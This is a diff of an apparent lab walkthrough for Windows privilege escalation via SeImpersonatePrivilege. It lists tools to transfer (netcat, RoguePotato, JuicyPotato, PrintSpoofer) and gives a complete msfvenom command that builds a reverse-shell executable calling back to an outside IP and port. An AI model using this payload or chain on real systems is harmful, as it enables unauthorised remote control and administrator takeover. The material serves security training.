@@ -37,11 +37,11 @@ C:\Users\Public\desktop>
 From the above scenarion there many ways you can try to exploit this but actually i am making this one so i can easy simplfy my way in with this easy way to become administrator.
 
 ## first thing were gonna need is transfering the following binaries into our target machine 
-1. nc.exe (specific for windows)
+1. nc.exe (specific for windows) - [windows netcat](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/nc.exe) - 🖥️ netcat binary download
 2. RoguePotato.exe - [RoguePotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/RoguePotato.md) - 🖥️ roguepotato binary usage
 3. JuicyPotato - [JuicyPotato](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/JuicyPotato.md) - 🖥️ JuicyPotato binary usage
 4. payload with msfvenom specific for windows(msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe)
-5. PrintSpoofer
+5. PrintSpoofer - [PrintSpoofer.md](https://github.com/alien-keric/SeImpersonatePrivilege/blob/main/PrintSpoofer.md) - 🖥️ PrintSpoofer binary usage
 
 ```
 C:\Users\Public\desktop>dir
